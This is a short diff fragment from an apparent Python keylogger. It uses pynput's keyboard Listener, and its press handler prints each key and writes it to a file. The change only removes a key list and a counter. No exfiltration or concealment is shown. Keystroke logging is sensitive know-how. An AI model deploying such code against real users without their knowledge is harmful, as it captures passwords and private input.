@@ -2,14 +2,7 @@ import pynput
 
 from pynput.keyboard import Key, Listener
 
-count = 0
-keys = []
-
 def press(key):
-    global keys, count
-    
-    keys.append(key)
-    count+=1
     print("{} pressed".format(key))
     write_to_file(key)
 
